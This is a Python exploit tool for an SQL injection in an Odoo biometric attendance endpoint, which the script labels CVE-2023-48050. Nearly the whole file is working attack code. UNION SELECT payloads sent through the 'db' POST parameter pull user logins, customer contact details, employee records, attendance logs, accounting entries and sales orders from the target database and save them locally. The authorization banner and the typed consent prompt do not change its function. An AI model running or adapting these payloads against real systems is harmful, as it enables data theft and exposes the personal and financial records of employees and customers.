import requests
import sys
import json
import time
import urllib3
import os
from datetime import datetime
from colorama import init, Fore, Style
import csv
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class SensitiveDataExtractor:
    def __init__(self, target_url, output_dir="sensitive_extraction"):
        """Initialize the sensitive data extractor"""
        self.target_url = target_url.rstrip('/')
        self.vulnerable_endpoint = '/cams/biometric-api3.0/'
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Testing)',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        # Create secure output directory
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.output_dir = f"{output_dir}_{timestamp}"
        self.create_secure_directory()
        
        # Track extraction for audit log
        self.audit_log = []
        
    def create_secure_directory(self):
        """Create a secure directory for sensitive data"""
        os.makedirs(self.output_dir, mode=0o700)
        os.makedirs(f"{self.output_dir}/users", mode=0o700)
        os.makedirs(f"{self.output_dir}/financial", mode=0o700)
        os.makedirs(f"{self.output_dir}/hr_data", mode=0o700)
        os.makedirs(f"{self.output_dir}/business_data", mode=0o700)
        os.makedirs(f"{self.output_dir}/audit", mode=0o700)
        print(f"{Fore.GREEN}[+] Secure directory created: {self.output_dir}")
        
    def log_extraction(self, table, records_count, status):
        """Log extraction activity for audit purposes"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "table": table,
            "records_extracted": records_count,
            "status": status
        }
        self.audit_log.append(entry)
        
    def extract_res_users(self):
        """Extract user account data"""
        print(f"\n{Fore.YELLOW}[+] Extracting res_users (User Accounts)...")
        
        users_data = []
        extracted_count = 0
        max_users = 100  # Limit for safety
        
        # Extract column names first
        columns_payload = "test' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='res_users'-- "
        columns = self.execute_extraction(columns_payload)
        
        if columns:
            print(f"{Fore.BLUE}[*] Columns found: {columns[:100]}...")
        
        # Extract user data with specific fields
        for offset in range(max_users):
            # Extract critical user fields
            payload = f"""test' UNION SELECT NULL,(
                SELECT row_to_json(t) FROM (
                    SELECT 
                        id,
                        login,
                        CASE WHEN password IS NOT NULL THEN 'HASH_PRESENT' ELSE 'NO_HASH' END as password_status,
                        create_date,
                        write_date,
                        active,
                        COALESCE(email, 'NO_EMAIL') as email,
                        COALESCE(signature, 'NO_SIGNATURE') as signature
                    FROM res_users 
                    LIMIT 1 OFFSET {offset}
                ) t
            )::text,NULL-- """
            
            result = self.execute_extraction(payload)
            if not result:
                break
                
            try:
                user_json = json.loads(result) if result.startswith('{') else {"raw": result}
                users_data.append(user_json)
                extracted_count += 1
                
                # Mask sensitive data in console output
                safe_output = f"User {extracted_count}: {user_json.get('login', 'unknown')} - Status: {user_json.get('active', 'unknown')}"
                print(f"{Fore.GREEN}[*] {safe_output}")
                
            except Exception as e:
                users_data.append({"raw_data": result, "parse_error": str(e)})
                
        # Save user data with encryption notice
        output_file = f"{self.output_dir}/users/res_users_extracted.json"
        self.save_sensitive_data(users_data, output_file, "res_users")
        
        self.log_extraction("res_users", extracted_count, "success")
        return extracted_count
        
    def extract_res_partner(self):
        """Extract partner/customer data"""
        print(f"\n{Fore.YELLOW}[+] Extracting res_partner (Partners/Customers)...")
        
        partners_data = []
        extracted_count = 0
        max_partners = 50
        
        for offset in range(max_partners):
            payload = f"""test' UNION SELECT NULL,(
                SELECT row_to_json(t) FROM (
                    SELECT 
                        id,
                        name,
                        CASE WHEN email IS NOT NULL THEN 'EMAIL_PRESENT' ELSE 'NO_EMAIL' END as email_status,
                        phone,
                        mobile,
                        city,
                        country_id,
                        is_company,
                        customer_rank,
                        supplier_rank,
                        create_date
                    FROM res_partner 
                    WHERE active = true
                    LIMIT 1 OFFSET {offset}
                ) t
            )::text,NULL-- """
            
            result = self.execute_extraction(payload)
            if not result:
                break
                
            try:
                partner_json = json.loads(result) if result.startswith('{') else {"raw": result}
                partners_data.append(partner_json)
                extracted_count += 1
                
                print(f"{Fore.GREEN}[*] Partner {extracted_count}: {partner_json.get('name', 'unknown')[:30]}...")
                
            except:
                partners_data.append({"raw_data": result})
                
        output_file = f"{self.output_dir}/business_data/res_partner_extracted.json"
        self.save_sensitive_data(partners_data, output_file, "res_partner")
        
        self.log_extraction("res_partner", extracted_count, "success")
        return extracted_count
        
    def extract_hr_employee(self):
        """Extract employee data"""
        print(f"\n{Fore.YELLOW}[+] Extracting hr_employee (Employee Records)...")
        
        employees_data = []
        extracted_count = 0
        max_employees = 100
        
        # Check if hr_employee table exists
        check_payload = "test' UNION SELECT NULL,(SELECT EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='hr_employee'))::text,NULL-- "
        table_exists = self.execute_extraction(check_payload)
        
        if table_exists != 't' and table_exists != 'true':
            print(f"{Fore.YELLOW}[!] hr_employee table not found or not accessible")
            self.log_extraction("hr_employee", 0, "table_not_found")
            return 0
            
        for offset in range(max_employees):
            payload = f"""test' UNION SELECT NULL,(
                SELECT row_to_json(t) FROM (
                    SELECT 
                        id,
                        name,
                        job_title,
                        work_email,
                        work_phone,
                        mobile_phone,
                        department_id,
                        manager_id,
                        CASE WHEN pin IS NOT NULL THEN 'PIN_SET' ELSE 'NO_PIN' END as pin_status,
                        CASE WHEN barcode IS NOT NULL THEN 'BARCODE_SET' ELSE 'NO_BARCODE' END as barcode_status
                    FROM hr_employee 
                    LIMIT 1 OFFSET {offset}
                ) t
            )::text,NULL-- """
            
            result = self.execute_extraction(payload)
            if not result:
                break
                
            try:
                employee_json = json.loads(result) if result.startswith('{') else {"raw": result}
                employees_data.append(employee_json)
                extracted_count += 1
                
                print(f"{Fore.GREEN}[*] Employee {extracted_count}: {employee_json.get('name', 'unknown')[:30]}...")
                
            except:
                employees_data.append({"raw_data": result})
                
        output_file = f"{self.output_dir}/hr_data/hr_employee_extracted.json"
        self.save_sensitive_data(employees_data, output_file, "hr_employee")
        
        self.log_extraction("hr_employee", extracted_count, "success")
        return extracted_count
        
    def extract_hr_attendance(self):
        """Extract attendance records"""
        print(f"\n{Fore.YELLOW}[+] Extracting hr_attendance (Attendance Logs)...")
        
        attendance_data = []
        extracted_count = 0
        
        # Get recent attendance records (last 100)
        payload = """test' UNION SELECT NULL,(
            SELECT json_agg(t) FROM (
                SELECT 
                    employee_id,
                    check_in,
                    check_out,
                    worked_hours
                FROM hr_attendance 
                ORDER BY check_in DESC
                LIMIT 100
            ) t
        )::text,NULL-- """
        
        result = self.execute_extraction(payload)
        if result:
            try:
                attendance_json = json.loads(result) if result.startswith('[') else [{"raw": result}]
                attendance_data = attendance_json
                extracted_count = len(attendance_data)
                
                print(f"{Fore.GREEN}[*] Extracted {extracted_count} attendance records")
                
            except:
                attendance_data = [{"raw_data": result}]
                
        output_file = f"{self.output_dir}/hr_data/hr_attendance_extracted.json"
        self.save_sensitive_data(attendance_data, output_file, "hr_attendance")
        
        self.log_extraction("hr_attendance", extracted_count, "success")
        return extracted_count
        
    def extract_account_move(self):
        """Extract accounting entries"""
        print(f"\n{Fore.YELLOW}[+] Extracting account_move (Accounting Entries)...")
        
        accounting_data = []
        extracted_count = 0
        max_records = 50
        
        for offset in range(max_records):
            payload = f"""test' UNION SELECT NULL,(
                SELECT row_to_json(t) FROM (
                    SELECT 
                        id,
                        name,
                        date,
                        state,
                        move_type,
                        amount_total,
                        amount_residual,
                        currency_id,
                        partner_id,
                        journal_id
                    FROM account_move 
                    ORDER BY date DESC
                    LIMIT 1 OFFSET {offset}
                ) t
            )::text,NULL-- """
            
            result = self.execute_extraction(payload)
            if not result:
                break
                
            try:
                move_json = json.loads(result) if result.startswith('{') else {"raw": result}
                accounting_data.append(move_json)
                extracted_count += 1
                
                print(f"{Fore.GREEN}[*] Accounting entry {extracted_count}: {move_json.get('name', 'unknown')}")
                
            except:
                accounting_data.append({"raw_data": result})
                
        output_file = f"{self.output_dir}/financial/account_move_extracted.json"
        self.save_sensitive_data(accounting_data, output_file, "account_move")
        
        self.log_extraction("account_move", extracted_count, "success")
        return extracted_count
        
    def extract_sale_order(self):
        """Extract sales orders"""
        print(f"\n{Fore.YELLOW}[+] Extracting sale_order (Sales Orders)...")
        
        sales_data = []
        extracted_count = 0
        max_orders = 50
        
        for offset in range(max_orders):
            payload = f"""test' UNION SELECT NULL,(
                SELECT row_to_json(t) FROM (
                    SELECT 
                        id,
                        name,
                        date_order,
                        state,
                        partner_id,
                        user_id,
                        amount_total,
                        currency_id,
                        invoice_status,
                        delivery_status
                    FROM sale_order 
                    ORDER BY date_order DESC
                    LIMIT 1 OFFSET {offset}
                ) t
            )::text,NULL-- """
            
            result = self.execute_extraction(payload)
            if not result:
                break
                
            try:
                order_json = json.loads(result) if result.startswith('{') else {"raw": result}
                sales_data.append(order_json)
                extracted_count += 1
                
                print(f"{Fore.GREEN}[*] Sales order {extracted_count}: {order_json.get('name', 'unknown')}")
                
            except:
                sales_data.append({"raw_data": result})
                
        output_file = f"{self.output_dir}/business_data/sale_order_extracted.json"
        self.save_sensitive_data(sales_data, output_file, "sale_order")
        
        self.log_extraction("sale_order", extracted_count, "success")
        return extracted_count
        
    def extract_ir_attachment(self):
        """Extract attachment metadata (not the files themselves)"""
        print(f"\n{Fore.YELLOW}[+] Extracting ir_attachment (Attachment Metadata)...")
        
        attachments_data = []
        extracted_count = 0
        max_attachments = 30
        
        for offset in range(max_attachments):
            payload = f"""test' UNION SELECT NULL,(
                SELECT row_to_json(t) FROM (
                    SELECT 
                        id,
                        name,
                        res_model,
                        res_id,
                        file_size,
                        mimetype,
                        create_date,
                        create_uid
                    FROM ir_attachment 
                    WHERE res_model IS NOT NULL
                    ORDER BY create_date DESC
                    LIMIT 1 OFFSET {offset}
                ) t
            )::text,NULL-- """
            
            result = self.execute_extraction(payload)
            if not result:
                break
                
            try:
                attachment_json = json.loads(result) if result.startswith('{') else {"raw": result}
                attachments_data.append(attachment_json)
                extracted_count += 1
                
                print(f"{Fore.GREEN}[*] Attachment {extracted_count}: {attachment_json.get('name', 'unknown')[:50]}...")
                
            except:
                attachments_data.append({"raw_data": result})
                
        output_file = f"{self.output_dir}/business_data/ir_attachment_metadata.json"
        self.save_sensitive_data(attachments_data, output_file, "ir_attachment")
        
        self.log_extraction("ir_attachment", extracted_count, "success")
        return extracted_count
        
    def extract_database_statistics(self):
        """Extract database statistics and summary"""
        print(f"\n{Fore.YELLOW}[+] Extracting database statistics...")
        
        stats = {}
        
        # Get table sizes
        payload = """test' UNION SELECT NULL,(
            SELECT json_agg(t) FROM (
                SELECT 
                    schemaname,
                    tablename,
                    pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) as size
                FROM pg_tables 
                WHERE schemaname = 'public'
                ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC
                LIMIT 20
            ) t
        )::text,NULL-- """
        
        result = self.execute_extraction(payload)
        if result:
            try:
                stats['table_sizes'] = json.loads(result)
            except:
                stats['table_sizes'] = result
                
        # Get record counts for sensitive tables
        sensitive_tables = ['res_users', 'res_partner', 'hr_employee', 'account_move', 'sale_order']
        counts = {}
        
        for table in sensitive_tables:
            count_payload = f"test' UNION SELECT NULL,(SELECT COUNT(*) FROM {table})::text,NULL-- "
            count = self.execute_extraction(count_payload)
            if count:
                counts[table] = count
                print(f"{Fore.BLUE}[*] {table}: {count} records")
                
        stats['record_counts'] = counts
        
        output_file = f"{self.output_dir}/audit/database_statistics.json"
        self.save_sensitive_data(stats, output_file, "statistics")
        
        return stats
        
    def execute_extraction(self, payload):
        """Execute SQL injection payload and extract data"""
        target_url = f"{self.target_url}{self.vulnerable_endpoint}"
        
        post_data = {
            'db': payload,
            'generate_attendance': 'true'
        }
        
        try:
            response = self.session.post(target_url, data=post_data, timeout=15)
            
            if response.text:
                # Try to extract JSON or text data from response
                lines = response.text.split('\n')
                for line in lines:
                    line = line.strip()
                    # Look for JSON data
                    if line.startswith('{') or line.startswith('['):
                        return line
                    # Look for non-HTML data
                    elif line and not line.startswith('<') and not line.startswith('<!'):
                        return line
                        
            return None
            
        except Exception as e:
            return None
            
    def save_sensitive_data(self, data, filepath, data_type):
        """Save sensitive data with security measures"""
        try:
            # Add metadata
            wrapped_data = {
                "extraction_metadata": {
                    "timestamp": datetime.now().isoformat(),
                    "data_type": data_type,
                    "records_count": len(data) if isinstance(data, list) else 1,
                    "classification": "SENSITIVE - AUTHORIZED ACCESS ONLY",
                    "hash": hashlib.sha256(json.dumps(data, default=str).encode()).hexdigest()
                },
                "data": data
            }
            
            with open(filepath, 'w') as f:
                json.dump(wrapped_data, f, indent=2, default=str)
                
            # Set restrictive permissions
            os.chmod(filepath, 0o600)
            
            print(f"{Fore.GREEN}[✓] Saved {data_type} to: {filepath}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to save {data_type}: {e}")
            
    def generate_final_report(self):
        """Generate comprehensive extraction report"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}        SENSITIVE DATA EXTRACTION REPORT")
        print(f"{Fore.CYAN}{'='*60}\n")
        
        # Save audit log
        audit_file = f"{self.output_dir}/audit/extraction_audit.json"
        with open(audit_file, 'w') as f:
            json.dump({
                "extraction_session": {
                    "target": self.target_url,
                    "start_time": self.audit_log[0]['timestamp'] if self.audit_log else "N/A",
                    "end_time": datetime.now().isoformat(),
                    "vulnerability": "CVE-2023-48050"
                },
                "extraction_log": self.audit_log
            }, f, indent=2)
            
        os.chmod(audit_file, 0o600)
        
        # Print summary
        print(f"{Fore.YELLOW}Extraction Summary:")
        print(f"{Fore.YELLOW}{'='*40}")
        
        total_records = 0
        for log_entry in self.audit_log:
            print(f"{Fore.GREEN}[✓] {log_entry['table']}: {log_entry['records_extracted']} records")
            total_records += log_entry['records_extracted']
            
        print(f"{Fore.YELLOW}{'='*40}")
        print(f"{Fore.CYAN}Total records extracted: {total_records}")
        print(f"{Fore.CYAN}Output directory: {self.output_dir}")
        
        print(f"\n{Fore.RED}⚠️  SECURITY WARNINGS:")
        print(f"{Fore.RED}1. This data contains sensitive information")
        print(f"{Fore.RED}2. Secure all extracted files immediately")
        print(f"{Fore.RED}3. Delete data after analysis using secure deletion")
        print(f"{Fore.RED}4. Report findings to system owner immediately")
        print(f"{Fore.RED}5. Do not share this data with unauthorized parties")
        
    def run(self):
        """Execute sensitive data extraction"""
        print(Fore.RED + """
╔══════════════════════════════════════════════════════╗
║        SENSITIVE DATA EXTRACTION TOOL               ║
║           AUTHORIZED USE ONLY                       ║
║     Unauthorized access is a criminal offense       ║
╚══════════════════════════════════════════════════════╝
        """)
        
        # Final authorization check
        auth = input(f"\n{Fore.RED}Type 'I HAVE WRITTEN AUTHORIZATION' to proceed: ")
        if auth != 'I HAVE WRITTEN AUTHORIZATION':
            print(f"{Fore.RED}[!] Extraction aborted.")
            sys.exit(1)
            
        print(f"\n{Fore.GREEN}[+] Starting sensitive data extraction...")
        
        try:
            # Extract from each sensitive table
            self.extract_res_users()
            self.extract_res_partner()
            self.extract_hr_employee()
            self.extract_hr_attendance()
            self.extract_account_move()
            self.extract_sale_order()
            self.extract_ir_attachment()
            self.extract_database_statistics()
            
            # Generate final report
            self.generate_final_report()
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Extraction interrupted")
            self.generate_final_report()
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {e}")
            import traceback
            traceback.print_exc()


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://10.6.23.9:9093")
        sys.exit(1)
        
    target_url = sys.argv[1]
    if not target_url.startswith(('http://', 'https://')):
        target_url = f'http://{target_url}'
        
    extractor = SensitiveDataExtractor(target_url)
    extractor.run()


if __name__ == '__main__':
    main()